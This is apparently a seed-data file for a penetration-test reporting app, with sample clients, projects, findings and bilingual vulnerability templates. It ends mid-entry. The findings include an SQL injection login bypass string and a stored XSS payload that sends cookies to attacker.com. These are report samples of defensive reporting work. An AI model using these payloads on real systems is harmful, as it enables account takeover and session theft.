
import type { Client, Project, Finding, Vulnerability, ProjectTemplate } from './types';

export let clients: Client[] = [
  { id: 'cli-1', name: 'Innovatech Solutions', contact: 'contact@innovatech.com', logoUrl: 'https://picsum.photos/seed/innovatech/128/128' },
  { id: 'cli-2', name: 'Quantum Dynamics', contact: 'security@quantum.com', logoUrl: 'https://picsum.photos/seed/quantum/128/128' },
  { id: 'cli-3', name: 'SecureBank Corp', contact: 'audit@securebank.com', logoUrl: 'https://picsum.photos/seed/securebank/128/128' },
  { id: 'cli-4', name: 'HealthFirst Providers', contact: 'compliance@healthfirst.com', logoUrl: 'https://picsum.photos/seed/healthfirst/128/128' },
];

export let projects: Project[] = [
  { 
    id: 'proj-1', 
    clientId: 'cli-1', 
    name: 'Q3 Web App Pentest', 
    reportBody: `## Executive Summary
This report outlines the results of an external penetration test conducted on the internet-facing assets of **Innovatech Solutions**. The assessment aimed to identify vulnerabilities that could be exploited by a remote attacker to compromise the security of the organization's perimeter.

---

## Scope & Methodology
The assessment was conducted between **July 1, 2023** and **July 15, 2023** from the perspective of an external, unauthenticated attacker (black-box).

### Scope
- **Web Applications:** *.innovatech.com, api.innovatech.com
- **External Network:** 198.51.100.0/24

### Methodology
1. **Reconnaissance:** Discovering subdomains, open ports, and services.
2. **Vulnerability Scanning:** Using automated tools to identify common vulnerabilities.
3. **Manual Verification & Exploitation:** Manually validating findings and attempting to exploit identified weaknesses.
4. **Reporting:** Documenting vulnerabilities and providing remediation guidance.

---

## Attack Narrative
The engagement began with reconnaissance against the *.innovatech.com domain, which revealed the existence of an outdated blog at 'blog.innovatech.com' and a development server at 'dev.innovatech.com' with directory listing enabled. An SQL Injection vulnerability was discovered and exploited on the main web application's login form, allowing for authentication bypass. This access was leveraged to uncover a Stored XSS vulnerability in the user profile section, which could be used to target other users, including administrators.

---

## Findings Classification
| Severity | CVSS v3.1 Score | Description |
|---|---|---|
| Critical | 9.0 - 10.0 | Vulnerabilities that could lead to immediate system compromise or a breach of the network perimeter. |
| High | 7.0 - 8.9 | Vulnerabilities that could allow an attacker to gain unauthorized access to systems or data. |
| Medium | 4.0 - 6.9 | Weaknesses that could reveal sensitive information or be chained with other vulnerabilities. |
| Low | 0.1 - 3.9 | Minor issues that reduce the overall security posture but are not directly exploitable. |
| Informational | 0.0 | Observations about the external footprint of the organization. |`, 
    startDate: '2023-07-01', 
    endDate: '2023-07-15', 
    status: 'Completed', 
    language: 'en', 
    createdAt: '2023-07-01T10:00:00Z', 
    updatedAt: '2023-07-15T18:00:00Z', 
    icon: 'Scan' 
  },
  { 
    id: 'proj-2', 
    clientId: 'cli-2', 
    name: 'Análisis de Red Interna', 
    reportBody: '', 
    startDate: '2023-08-10', 
    endDate: '2023-08-20', 
    status: 'In Progress', 
    language: 'es', 
    createdAt: '2023-08-10T09:00:00Z', 
    updatedAt: '2023-08-15T14:30:00Z', 
    icon: 'Network' 
  },
];

export let findings: Finding[] = [
  { 
    id: 'find-1', 
    projectId: 'proj-1', 
    vulnerabilityId: 'vuln-001', 
    title: 'SQL Injection on Login Form', 
    severity: 'Critical', 
    cvss: 9.8, 
    markdown: `### Overview
A critical SQL Injection vulnerability was identified in the main login form of the application. This flaw allows an attacker to bypass authentication mechanisms and gain unauthorized access to the application, potentially with administrative privileges.

### Technical Description
The 'username' parameter of the login POST request to /auth/login is vulnerable. By submitting a crafted payload like \`' OR '1'='1' --\`, an attacker can manipulate the backend SQL query to always return true, effectively logging in as the first user in the database (often an administrator).

### Affected Components
- \`/auth/login\` endpoint
- User authentication module

### Impact
Successful exploitation grants an attacker unauthorized access to the application. Depending on the user account compromised (e.g., an administrator), this could lead to a full compromise of the application, data exfiltration, and further attacks against the underlying infrastructure.

### Recommendations
Implement parameterized queries (prepared statements) to handle all user-supplied input in database queries. This is the most effective way to prevent SQL Injection attacks. Validate and sanitize all user input on the server side as a defense-in-depth measure.`, 
    createdAt: '2023-07-05T11:00:00Z', 
    updatedAt: '2023-07-10T15:00:00Z' 
  },
  { 
    id: 'find-2', 
    projectId: 'proj-1', 
    vulnerabilityId: 'vuln-003', 
    title: 'Stored Cross-Site Scripting (XSS) in User Profile', 
    severity: 'High', 
    cvss: 8.0, 
    markdown: `### Overview
A stored XSS vulnerability exists in the user profile section, allowing an attacker to inject malicious scripts that execute in the browsers of other users, including administrators.

### Technical Description
The 'bio' field in the user profile page does not properly sanitize user input before storing it in the database and rendering it on the page. An attacker can set their biography to a malicious script, such as \`<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>\`. When another user views the attacker's profile, the script will execute in their browser.

### Affected Components
- User profile page (e.g., /profile/{userId})
- 'bio' field update functionality

### Impact
This vulnerability can be used to steal session cookies, perform actions on behalf of other users (CSRF), redirect users to malicious websites, or deface the application. If an administrator's session is hijacked, it could lead to a full application compromise.

### Recommendations
Implement context-aware output encoding for all user-supplied data before it is rendered in the browser. Use a library like DOMPurify to sanitize HTML content if users are allowed to submit rich text.`, 
    createdAt: '2023-07-06T14:00:00Z', 
    updatedAt: '2023-07-11T10:00:00Z' 
  },
];

export let vulnerabilities: Vulnerability[] = [
  {
    id: 'vuln-001',
    title_en: 'SQL Injection',
    title_es: 'Inyección SQL',
    cwe: 'CWE-89',
    severity: 'Critical',
    cvss: {
      score: 9.8,
      vectorString: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
      attackVector: 'Network',
      attackComplexity: 'Low',
      privilegesRequired: 'None',
      userInteraction: 'None',
      scope: 'Unchanged',
      confidentiality: 'High',
      integrity: 'High',
      availability: 'High',
    },
    overview_en: 'An attacker can interfere with the queries that an application makes to its database.',
    overview_es: 'Un atacante puede interferir con las consultas que una aplicación hace a su base de datos.',
    technicalDescription_en: 'SQL injection is a web security vulnerability that allows an attacker to alter the SQL queries made to the database. This can be used to retrieve data that the user is not authorized to access, or to execute arbitrary commands on the database.',
    technicalDescription_es: 'La inyección SQL es una vulnerabilidad de seguridad web que permite a un atacante alterar las consultas SQL que se realizan a la base de datos. Esto puede usarse para recuperar datos a los que el usuario no está autorizado a acceder, o para ejecutar comandos arbitrarios en la base de datos.',
    affectedComponents_en: '[TODO Specify the vulnerable parameter and endpoint, e.g., The "id" parameter in the GET request to "/products/view.php".]',
    affectedComponents_es: '[TODO Especificar el parámetro y el endpoint vulnerables, p. ej., El parámetro "id" en la solicitud GET a "/products/view.php".]',
    impact_en: 'A successful SQL injection attack can result in unauthorized access to sensitive data, such as passwords, credit card details, or personal user information. In some cases, an attacker can escalate an SQL injection attack to compromise the underlying server or other back-end infrastructure, or perform a denial-of-service attack.',
    impact_es: 'Un ataque de inyección SQL exitoso puede resultar en acceso no autorizado a datos sensibles, como contraseñas, detalles de tarjetas de crédito o información personal del usuario. En algunos casos, un atacante puede escalar un ataque de inyección SQL para comprometer el servidor subyacente u otra infraestructura de back-end, o realizar un ataque de denegación de servicio.',
    recommendations_en: 'The most effective way to prevent SQL injection is to use parameterized queries (also known as prepared statements). As a secondary defense, validate user input against a whitelist of allowed characters.',
    recommendations_es: 'La forma más efectiva de prevenir la inyección de SQL es usar consultas parametrizadas (también conocidas como sentencias preparadas). Como defensa secundaria, valide la entrada del usuario con una lista blanca de caracteres permitidos.',
    details_en: '[TODO Provide a Proof of Concept (PoC). For example, a URL, a request body, and the observed result.]',
    details_es: '[TODO Proporcione una Prueba de Concepto (PoC). Por ejemplo, una URL, un cuerpo de solicitud y el resultado observado.]',
    remediation_en: {
      shortTerm: 'Implement input validation to whitelist expected characters and patterns.',
      mediumTerm: 'Refactor all database queries to use parameterized statements.',
      longTerm: 'Conduct a full code review to identify and fix all instances of SQL injection.',
    },
    remediation_es: {
      shortTerm: 'Implementar validación de entrada para incluir en una lista blanca los caracteres y patrones esperados.',
      mediumTerm: 'Refactorizar todas las consultas a la base de datos para que utilicen sentencias parametrizadas.',
      longTerm: 'Realizar una revisión completa del código para identificar y corregir todas las instancias de inyección de SQL.',
    },
    references: ['https://owasp.org/www-community/attacks/SQL_Injection', 'https://portswigger.net/web-security/sql-injection'],
    tags: ['Injection', 'OWASP Top 10', 'A03:2021-Injection'],
  },
  {
    id: 'vuln-002',
    title_en: 'Broken Access Control',
    title_es: 'Control de Acceso Roto',
    cwe: 'CWE-284',
    severity: 'High',
    cvss: {
      score: 8.8,
      vectorString: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H',
      attackVector: 'Network',
      attackComplexity: 'Low',
      privilegesRequired: 'Low',
      userInteraction: 'None',
      scope: 'Unchanged',
      confidentiality: 'High',
      integrity: 'High',
      availability: 'High',
    },
    overview_en: 'Users can act outside of their intended permissions, leading to unauthorized information disclosure, modification, or destruction of all data.',
    overview_es: 'Los usuarios pueden actuar fuera de sus permisos previstos, lo que lleva a la divulgación, modificación o destrucción no autorizada de todos los datos.',
    technicalDescription_en: 'Access control is not properly enforced on the server side. An attacker, authenticated as a low-privileged user, can forge requests to administrative endpoints by guessing the URL. Since the server does not verify the user\'s permissions, the action is executed with administrative privileges.',
    technicalDescription_es: 'El control de acceso no se aplica correctamente en el lado del servidor. Un atacante, autenticado como un usuario con pocos privilegios, puede falsificar solicitudes a los endpoints administrativos adivinando la URL. Dado que el servidor no verifica los permisos del usuario, la acción se ejecuta con privilegios administrativos.',
    affectedComponents_en: '[TODO Specify the vulnerable endpoint, e.g., The administrative endpoint "/admin/deleteUser" does not check if the logged-in user has administrative rights.]',
    affectedComponents_es: '[TODO Especificar el endpoint vulnerable, p. ej., El endpoint administrativo "/admin/deleteUser" no comprueba si el usuario que ha iniciado sesión tiene derechos administrativos.]',
    impact_en: 'This vulnerability can lead to unauthorized users gaining access to sensitive data, modifying user data, or performing administrative actions, potentially leading to a full compromise of the application.',
    impact_es: 'Esta vulnerabilidad puede llevar a que usuarios no autorizados obtengan acceso a datos sensibles, modifiquen datos de usuarios o realicen acciones administrativas, lo que podría llevar a un compromiso total de la aplicación.',
    recommendations_en: 'Implement access control checks on the server for every request that requires specific permissions. Deny all access by default. User roles and permissions should be verified on the server-side, not just hidden in the UI.',
    recommendations_es: 'Implementar controles de control de acceso en el servidor para cada solicitud que requiera permisos específicos. Denegar todo el acceso por defecto. Los roles y permisos de los usuarios deben verificarse en el lado del servidor, no solo ocultarse en la interfaz de usuario.',
    details_en: '[TODO Provide a PoC. Show a request made by a low-privileged user to an admin endpoint and the successful response.]',
    details_es: '[TODO Proporcione una PoC. Muestre una solicitud realizada por un usuario con pocos privilegios a un endpoint de administrador y la respuesta exitosa.]',
    remediation_en: {
      shortTerm: 'Immediately add server-side permission checks to the most critical administrative functions.',
      mediumTerm: 'Implement a centralized, reusable access control mechanism and apply it to all relevant endpoints.',
      longTerm: 'Review the entire application to ensure that access control is consistently applied based on user roles and privileges.',
    },
    remediation_es: {
      shortTerm: 'Añadir inmediatamente comprobaciones de permisos del lado del servidor a las funciones administrativas más críticas.',
      mediumTerm: 'Implementar un mecanismo de control de acceso centralizado y reutilizable y aplicarlo a todos los endpoints relevantes.',
      longTerm: 'Revisar toda la aplicación para garantizar que el control de acceso se aplique de forma coherente en función de los roles y privilegios del usuario.',
    },
    references: ['https://owasp.org/Top10/A01_2021-Broken_Access_Control/'],
    tags: ['Access Control', 'OWASP Top 10', 'A01:2021-Broken_Access_Control'],
  },
  {
    id: 'vuln-003',
    title_en: 'Cross-Site Scripting (XSS) - Stored',
    title_es: 'Cross-Site Scripting (XSS) - Almacenado',
    cwe: 'CWE-79',
    severity: 'High',
    cvss: {
      score: 8.0,
      vectorString: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N',
      attackVector: 'Network',
      attackComplexity: 'Low',
      privilegesRequired: 'Low',
      userInteraction: 'Required',
      scope: 'Changed',
      confidentiality: 'High',
      integrity: 'Low',
      availability: 'None',
    },
    overview_en: 'An attacker can inject malicious scripts into a web page, which are then executed by other users.',
    overview_es: 'Un atacante puede inyectar scripts maliciosos en una página web, que luego son ejecutados por otros usuarios.',
    technicalDescription_en: 'The application stores user-supplied data without properly sanitizing it. This data is then retrieved and displayed to other users. An attacker can submit a malicious script, which is then stored in the database. When another user views the page containing this data, the script executes in their browser in the context of their session.',
    technicalDescription_es: 'La aplicación almacena datos proporcionados por el usuario sin sanitizarlos adecuadamente. Estos datos se recuperan y se muestran a otros usuarios. Un atacante puede enviar un script malicioso, que luego se almacena en la base de datos. Cuando otro usuario ve la página que contiene estos datos, el script se ejecuta en su navegador en el contexto de su sesión.',
    affectedComponents_en: '[TODO Specify the vulnerable field and page, e.g., The "comment" field on the "blog-post" page.]',
    affectedComponents_es: '[TODO Especificar el campo y la página vulnerables, p. ej., El campo "comentario" en la página "entrada-de-blog".]',
    impact_en: 'Stored XSS can be used to steal session cookies, perform actions on behalf of the user, log keystrokes, or redirect the user to a malicious site. If an administrator is targeted, this can lead to full application compromise.',
    impact_es: 'El XSS almacenado se puede usar para robar cookies de sesión, realizar acciones en nombre del usuario, registrar pulsaciones de teclas o redirigir al usuario a un sitio malicioso. Si se ataca a un administrador, esto puede llevar a un compromiso total de la aplicación.',
    recommendations_en: 'Implement context-aware output encoding. When user-controllable data is inserted into HTML, ensure it is properly encoded for that context (e.g., HTML entity encoding for element content, URL encoding for URL attributes). Use a library like DOMPurify to sanitize user-supplied HTML.',
    recommendations_es: 'Implementar codificación de salida consciente del contexto. Cuando se insertan datos controlables por el usuario en HTML, asegúrese de que estén codificados correctamente para ese contexto (p. ej., codificación de entidades HTML para el contenido del elemento, codificación de URL para los atributos de URL). Use una biblioteca como DOMPurify para sanitizar el HTML proporcionado por el usuario.',
    details_en: '[TODO Provide a PoC payload, e.g., `<script>alert(document.cookie)</script>` and a screenshot of the alert box.]',
    details_es: '[TODO Proporcione una carga útil de PoC, p. ej., `<script>alert(document.cookie)</script>` y una captura de pantalla del cuadro de alerta.]',
    remediation_en: {
      shortTerm: 'Immediately implement output encoding on the vulnerable pages.',
      mediumTerm: 'Use a templating engine that automatically handles contextual encoding, such as React or Vue.',
      longTerm: 'Implement a strict Content Security Policy (CSP) to mitigate the impact of any future XSS vulnerabilities.',
    },
    remediation_es: {
      shortTerm: 'Implementar inmediatamente la codificación de salida en las páginas vulnerables.',
      mediumTerm: 'Usar un motor de plantillas que maneje automáticamente la codificación contextual, como React o Vue.',
      longTerm: 'Implementar una Política de Seguridad de Contenido (CSP) estricta para mitigar el impacto de cualquier futura vulnerabilidad XSS.',
    },
    references: ['https://owasp.org/www-community/attacks/xss/'],
    tags: ['XSS', 'Injection', 'OWASP Top 10'],
  },
  {
    id: 'vuln-004',
    title_en: 'Server-Side Request Forgery (SSRF)',
    title_es: 'Server-Side Request Forgery (SSRF)',
    cwe: 'CWE-918',
    severity: 'Critical',
    cvss: {
      score: 9.0,
      vectorString: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N',
      attackVector: 'Network',
      attackComplexity: 'Low',
      privilegesRequired: 'Low',
      userInteraction: 'None',
      scope: 'Changed',
      confidentiality: 'High',
      integrity: 'Low',
      availability: 'None',
    },
    overview_en: 'An attacker can force the server to make requests to internal or external resources.',
    overview_es: 'Un atacante puede forzar al servidor a realizar solicitudes a recursos internos o externos.',
    technicalDescription_en: 'The application includes a feature that fetches a resource based on a user-supplied URL. An attacker can provide a URL pointing to an internal service that is not publicly accessible. The server will make the request to the internal service and may return the response to the attacker, thus pivoting into the internal network.',
    technicalDescription_es: 'La aplicación incluye una función que obtiene un recurso basado en una URL proporcionada por el usuario. Un atacante puede proporcionar una URL que apunte a un servicio interno que no es de acceso público. El servidor realizará la solicitud al servicio interno y puede devolver la respuesta al atacante, pivotando así hacia la red interna.',
    affectedComponents_en: '[TODO Specify the vulnerable functionality, e.g., A "Import from URL" feature for profile pictures.]',
    affectedComponents_es: '[TODO Especificar la funcionalidad vulnerable, p. ej., una función de "Importar desde URL" para las imágenes de perfil.]',
    impact_en: 'SSRF can be used to scan internal networks, access internal services, or interact with cloud provider metadata endpoints (like http://169.254.169.254 on AWS) to extract credentials. The impact ranges from information disclosure to full remote code execution, depending on the internal services accessible.',
    impact_es: 'SSRF se puede usar para escanear redes internas, acceder a servicios internos o interactuar con los endpoints de metadatos del proveedor de la nube (como http://169.254.169.254 en AWS) para extraer credenciales. El impacto va desde la divulgación de información hasta la ejecución remota de código, dependiendo de los servicios internos accesibles.',
    recommendations_en: 'Do not allow user input to directly determine the URL that the server requests. If necessary, maintain a whitelist of allowed domains, protocols, and ports that the server is permitted to request. Server responses from requested URLs should never be returned directly to the user.',
    recommendations_es: 'No permitir que la entrada del usuario determine directamente la URL que solicita el servidor. Si es necesario, mantenga una lista blanca de dominios, protocolos y puertos permitidos que el servidor puede solicitar. Las respuestas del servidor de las URL solicitadas nunca deben devolverse directamente al usuario.',
    details_en: '[TODO Provide a PoC. Show a request to the vulnerable feature with an internal URL (e.g., http://localhost:8080/admin) and the server\'s response.]',
    details_es: '[TODO Proporcione una PoC. Muestre una solicitud a la función vulnerable con una URL interna (p. ej., http://localhost:8080/admin) y la respuesta del servidor.]',
    remediation_en: {
      shortTerm: 'Implement a strict whitelist of allowed domains and IP addresses.',
      mediumTerm: 'Disable support for unused URL schemas (e.g., `file://`, `gopher://`).',
      longTerm: 'Redesign the feature to avoid server-initiated requests based on user input. If this is not possible, use a dedicated, isolated proxy for making external requests.',
    },
    remediation_es: {
      shortTerm: 'Implementar una lista blanca estricta de dominios y direcciones IP permitidos.',
      mediumTerm: 'Deshabilitar el soporte para esquemas de URL no utilizados (p. ej., `file://`, `gopher://`).',
      longTerm: 'Rediseñar la función para evitar solicitudes iniciadas por el servidor basadas en la entrada del usuario. Si esto no es posible, utilice un proxy dedicado y aislado para realizar solicitudes externas.',
    },
    references: ['https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_(SSRF)/'],
    tags: ['SSRF', 'OWASP Top 10', 'A10:2021-Server-Side_Request_Forgery'],
  },
  {
    id: 'vuln-005',
    title_en: 'Security Misconfiguration',
    title_es: 'Configuración de Seguridad Incorrecta',
    cwe: 'CWE-16',
    severity: 'Medium',
    cvss: {
      score: 5.3,
      vectorString: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N',
      attackVector: 'Network',
      attackComplexity: 'Low',
      privilegesRequired: 'None',
      userInteraction: 'None',
      scope: 'Unchanged',
      confidentiality: 'Low',
      integrity: 'None',
      availability: 'None',
    },
    overview_en: 'The application or its underlying infrastructure is not configured securely, potentially exposing sensitive information or functionality.',
    overview_es: 'La aplicación o su infraestructura subyacente no está configurada de forma segura, lo que podría exponer información o funcionalidades sensibles.',
    technicalDescription_en: 'This is a broad category that can include many issues, such as running software with default credentials, enabling unnecessary features (e.g., directory listing), using outdated software, or displaying overly verbose error messages that reveal internal application details.',
    technicalDescription_es: 'Esta es una categoría amplia que puede incluir muchos problemas, como ejecutar software con credenciales predeterminadas, habilitar funciones innecesarias (p. ej., listado de directorios), usar software obsoleto o mostrar mensajes de error demasiado detallados que revelan detalles internos de la aplicación.',
    affectedComponents_en: '[TODO Specify the misconfiguration, e.g., The Apache web server has directory listing enabled on the "/assets" directory.]',
    affectedComponents_es: '[TODO Especificar la configuración incorrecta, p. ej., El servidor web Apache tiene habilitado el listado de directorios en el directorio "/assets".]',
    impact_en: 'The impact varies widely depending on the specific misconfiguration. It can range from minor information disclosure to full system compromise if default credentials for an administrative interface are exposed.',
    impact_es: 'El impacto varía ampliamente según la configuración incorrecta específica. Puede ir desde una divulgación de información menor hasta un compromiso total del sistema si se exponen las credenciales predeterminadas para una interfaz administrativa.',
    recommendations_en: 'Follow a hardening guide for all parts of the technology stack. Regularly review configurations and disable any unnecessary features or services. Keep all software and dependencies up to date.',
    recommendations_es: 'Siga una guía de fortalecimiento para todas las partes de la pila de tecnología. Revise regularmente las configuraciones y deshabilite cualquier función o servicio innecesario. Mantenga todo el software y las dependencias actualizadas.',
    details_en: '[TODO Provide a PoC, e.g., a screenshot of a directory listing or a verbose error message.]',
    details_es: '[TODO Proporcione una PoC, p. ej., una captura de pantalla de un listado de directorios o un mensaje de error detallado.]',
    remediation_en: {
      shortTerm: 'Immediately address the specific misconfiguration (e.g., disable directory listing, change default passwords).',
      mediumTerm: 'Develop a security configuration standard for all components of the application stack.',
      longTerm: 'Implement an automated configuration management and auditing tool to ensure compliance with security standards.',
    },
    remediation_es: {
      shortTerm: 'Abordar inmediatamente la configuración incorrecta específica (p. ej., deshabilitar el listado de directorios, cambiar las contraseñas predeterminadas).',
      mediumTerm: 'Desarrollar un estándar de configuración de seguridad para todos los componentes de la pila de aplicaciones.',
      longTerm: 'Implementar una herramienta automatizada de gestión y auditoría de la configuración para garantizar el cumplimiento de los estándares de seguridad.',
    },
    references: ['https://owasp.org/Top10/A05_2021-Security_Misconfiguration/'],
    tags: ['Misconfiguration', 'OWASP Top 10', 'A05:2021-Security_Misconfiguration'],
  },
  {
    id: 'vuln-006',
    title_en: 'Cryptographic Failures',
    title_es: 'Fallos Criptográficos',
    cwe: 'CWE-310',
    severity: 'High',
    cvss: {
      score: 7.5,
      vectorString: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N',
      attackVector: 'Network',
      attackComplexity: 'Low',
      privilegesRequired: 'None',
      userInteraction: 'None',
      scope: 'Unchanged',
      confidentiality: 'High',
      integrity: 'None',
      availability: 'None',
    },
    overview_en: 'Sensitive data is not properly protected in transit or at rest.',
    overview_es: 'Los datos sensibles no están protegidos correctamente en tránsito o en reposo.',
    technicalDescription_en: 'This category covers failures related to cryptography, which can lead to exposure of sensitive data. Examples include transmitting data in cleartext (e.g., over HTTP), using weak or outdated cryptographic algorithms (e.g., MD5 for hashing passwords), or improper key management.',
    technicalDescription_es: 'Esta categoría cubre fallos relacionados con la criptografía, que pueden llevar a la exposición de datos sensibles. Los ejemplos incluyen la transmisión de datos en texto claro (p. ej., a través de HTTP), el uso de algoritmos criptográficos débiles u obsoletos (p. ej., MD5 para hashear contraseñas) o una gestión de claves inadecuada.',
    affectedComponents_en: '[TODO Specify the failure, e.g., The application transmits authentication credentials over HTTP instead of HTTPS.]',
    affectedComponents_es: '[TODO Especificar el fallo, p. ej., La aplicación transmite las credenciales de autenticación a través de HTTP en lugar de HTTPS.]',
    impact_en: 'Cryptographic failures can lead to the compromise of sensitive information, such as user credentials, personal identifiable information (PII), or financial data. An attacker who can intercept traffic can easily read and exploit this data.',
    impact_es: 'Los fallos criptográficos pueden llevar al compromiso de información sensible, como credenciales de usuario, información de identificación personal (PII) o datos financieros. Un atacante que pueda interceptar el tráfico puede leer y explotar fácilmente estos datos.',
    recommendations_en: 'Encrypt all sensitive data in transit using TLS 1.2 or higher with strong ciphers. Encrypt all sensitive data at rest. Use strong, modern, and vetted cryptographic algorithms. Do not attempt to create your own cryptographic algorithms or protocols.',
    recommendations_es: 'Cifre todos los datos sensibles en tránsito utilizando TLS 1.2 o superior con cifrados fuertes. Cifre todos los datos sensibles en reposo. Utilice algoritmos criptográficos fuertes, modernos y probados. No intente crear sus propios algoritmos o protocolos criptográficos.',
    details_en: '[TODO Provide a PoC, e.g., a screenshot from Wireshark showing cleartext credentials being transmitted.]',
    details_es: '[TODO Proporcione una PoC, p. ej., una captura de pantalla de Wireshark que muestre la transmisión de credenciales en texto claro.]',
    remediation_en: {
      shortTerm: 'Enforce the use of HTTPS across the entire application by implementing HSTS (HTTP Strict Transport Security).',
      mediumTerm: 'Replace all instances of weak or deprecated cryptographic algorithms (e.g., MD5, SHA1) with strong alternatives (e.g., bcrypt, Argon2).',
      longTerm: 'Implement a comprehensive data classification policy to identify all sensitive data and ensure it is encrypted both in transit and at rest.',
    },
    remediation_es: {
      shortTerm: 'Hacer cumplir el uso de HTTPS en toda la aplicación mediante la implementación de HSTS (HTTP Strict Transport Security).',
      mediumTerm: 'Reemplazar todas las instancias de algoritmos criptográficos débiles o en desuso (p. ej., MD5, SHA1) con alternativas fuertes (p. ej., bcrypt, Argon2).',
      longTerm: 'Implementar una política integral de clasificación de datos para identificar todos los datos sensibles y garantizar que estén cifrados tanto en tránsito como en reposo.',
    },
    references: ['https://owasp.org/Top10/A02_2021-Cryptographic_Failures/'],
    tags: ['Cryptography', 'OWASP Top 10', 'A02:2021-Cryptographic_Failures', 'TLS/SSL'],
  },
  {
    id: 'vuln-007',
    title_en: 'Insecure Deserialization',
    title_es: 'Deserialización Insegura',
    cwe: 'CWE-502',
    severity: 'Critical',
    cvss: {
      score: 9.8,
      vectorString: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
      attackVector: 'Network',
      attackComplexity: 'Low',
      privilegesRequired: 'None',
      userInteraction: 'None',
      scope: 'Unchanged',
      confidentiality: 'High',
      integrity: 'High',
      availability: 'High',
    },
    overview_en: 'An attacker can manipulate serialized objects to execute arbitrary code on the server.',
    overview_es: 'Un atacante puede manipular objetos serializados para ejecutar código arbitrario en el servidor.',
    technicalDescription_en: 'The application deserializes untrusted data without sufficient validation. An attacker can craft a malicious serialized object. When the application deserializes this object, it can trigger the execution of code on the server, often leading to remote code execution (RCE).',
    technicalDescription_es: 'La aplicación deserializa datos no confiables sin una validación suficiente. Un atacante puede crear un objeto serializado malicioso. Cuando la aplicación deserializa este objeto, puede desencadenar la ejecución de código en el servidor, lo que a menudo conduce a la ejecución remota de código (RCE).',
    affectedComponents_en: '[TODO Specify the vulnerable library and data, e.g., The application uses an old version of Jackson to deserialize a user-supplied JSON object.]',
    affectedComponents_es: '[TODO Especificar la librería y los datos vulnerables, p. ej., La aplicación utiliza una versión antigua de Jackson para deserializar un objeto JSON proporcionado por el usuario.]',
    impact_en: 'Insecure deserialization often leads to remote code execution. Even when not leading to RCE, it can be used to perform denial-of-service attacks, access control bypasses, and other attacks.',
    impact_es: 'La deserialización insegura a menudo conduce a la ejecución remota de código. Incluso cuando no conduce a RCE, se puede usar para realizar ataques de denegación de servicio, omisiones de control de acceso y otros ataques.',
    recommendations_en: 'Avoid deserializing data from untrusted sources. If you must, use a safe, non-executable data format like JSON and avoid any libraries that support advanced object types. Perform integrity checks, such as digital signatures, on any serialized objects to prevent hostile object creation or data tampering.',
    recommendations_es: 'Evite deserializar datos de fuentes no confiables. Si es necesario, utilice un formato de datos seguro y no ejecutable como JSON y evite cualquier librería que admita tipos de objetos avanzados. Realice comprobaciones de integridad, como firmas digitales, en cualquier objeto serializado para evitar la creación de objetos hostiles o la manipulación de datos.',
    details_en: '[TODO Provide a PoC using a tool like ysoserial to generate a payload for the specific vulnerable library.]',
    details_es: '[TODO Proporcione una PoC utilizando una herramienta como ysoserial para generar una carga útil para la librería vulnerable específica.]',
    remediation_en: {
      shortTerm: 'Update the vulnerable deserialization library to the latest patched version.',
      mediumTerm: 'Implement strict type constraints during deserialization to only allow expected object types.',
      longTerm: 'Refactor the application to use a simple, non-executable data format for serialization, such as pure JSON, and avoid deserializing complex objects.',
    },
    remediation_es: {
      shortTerm: 'Actualizar la librería de deserialización vulnerable a la última versión parcheada.',
      mediumTerm: 'Implementar restricciones de tipo estrictas durante la deserialización para permitir solo los tipos de objetos esperados.',
      longTerm: 'Refactorizar la aplicación para usar un formato de datos simple y no ejecutable para la serialización, como JSON puro, y evitar la deserialización de objetos complejos.',
    },
    references: ['https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/'],
    tags: ['Deserialization', 'OWASP Top 10', 'A08:2021-Software_and_Data_Integrity_Failures'],
  },
  {
    id: 'vuln-008',
    title_en: 'Identification and Authentication Failures',
    title_es: 'Fallos de Identificación y Autenticación',
    cwe: 'CWE-287',
    severity: 'Medium',
    cvss: {
      score: 6.5,
      vectorString: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N',
      attackVector: 'Network',
      attackComplexity: 'Low',
      privilegesRequired: 'None',
      userInteraction: 'None',
      scope: 'Unchanged',
      confidentiality: 'Low',
      integrity: 'Low',
      availability: 'None',
    },
    overview_en: 'Weaknesses in user identity management, authentication, and session management can allow an attacker to impersonate legitimate users.',
    overview_es: 'Las debilidades en la gestión de la identidad del usuario, la autenticación y la gestión de sesiones pueden permitir a un atacante hacerse pasar por usuarios legítimos.',
    technicalDescription_en: 'This category includes vulnerabilities such as weak password policies, predictable session tokens, lack of brute-force protection on login forms, and not properly invalidating session tokens upon logout or password change.',
    technicalDescription_es: 'Esta categoría incluye vulnerabilidades como políticas de contraseñas débiles, tokens de sesión predecibles, falta de protección contra ataques de fuerza bruta en los formularios de inicio de sesión y no invalidar correctamente los tokens de sesión al cerrar sesión o cambiar la contraseña.',
    affectedComponents_en: '[TODO Specify the weakness, e.g., The login form does not implement rate limiting, allowing an attacker to attempt thousands of passwords per minute.]',
    affectedComponents_es: '[TODO Especificar la debilidad, p. ej., El formulario de inicio de sesión no implementa limitación de velocidad, lo que permite a un atacante intentar miles de contraseñas por minuto.]',
    impact_en: 'Authentication failures can lead to the compromise of user accounts. The impact depends on the privileges of the compromised user.',
    impact_es: 'Los fallos de autenticación pueden llevar al compromiso de las cuentas de usuario. El impacto depende de los privilegios del usuario comprometido.',
    recommendations_en: 'Implement multi-factor authentication (MFA). Enforce strong, complex passwords. Implement rate limiting and account lockout mechanisms to protect against brute-force attacks. Ensure session tokens are regenerated after login and properly invalidated at logout.',
    recommendations_es: 'Implementar la autenticación multifactor (MFA). Exigir contraseñas fuertes y complejas. Implementar mecanismos de limitación de velocidad y bloqueo de cuentas para proteger contra ataques de fuerza bruta. Asegurarse de que los tokens de sesión se regeneren después del inicio de sesión y se invaliden correctamente al cerrar sesión.',
    details_en: '[TODO Provide a PoC, e.g., a screenshot from Burp Intruder showing a successful password brute-force attack.]',
